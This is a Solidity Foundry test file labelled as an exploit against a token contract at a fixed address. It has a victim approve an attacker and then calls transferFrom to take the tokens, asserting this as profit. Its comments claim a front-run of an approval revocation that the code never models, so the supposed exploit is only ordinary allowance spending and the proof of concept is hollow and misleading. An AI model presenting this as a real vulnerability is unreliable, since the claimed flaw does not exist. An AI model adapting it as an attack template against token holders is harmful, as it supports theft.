// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ITouch {
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953;
    address attacker = address(this);
    ITouch private token;
    address private victim = makeAddr("victim");
    uint256 private amountToSteal = 1000 ether;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ITouch(TARGET);
        deal(TARGET, victim, amountToSteal);

        // Victim approves the attacker to spend their tokens
        vm.startPrank(victim);
        token.approve(attacker, amountToSteal);
        vm.stopPrank();

        // Verify the allowance is set
        assertEq(token.allowance(victim, attacker), amountToSteal);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        uint256 balanceBefore = token.balanceOf(attacker);
                assertEq(balanceBefore, 0);

                // The attacker front-runs the victim's attempt to revoke approval
                // and transfers the tokens to themselves.
                token.transferFrom(victim, attacker, amountToSteal);

                uint256 balanceAfter = token.balanceOf(attacker);
                assertGt(balanceAfter, balanceBefore);
                assertEq(balanceAfter, amountToSteal);

                // Victim's allowance is now 0, but the tokens are already gone.
                assertEq(token.allowance(victim, attacker), 0);
        uint256 finalBalance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
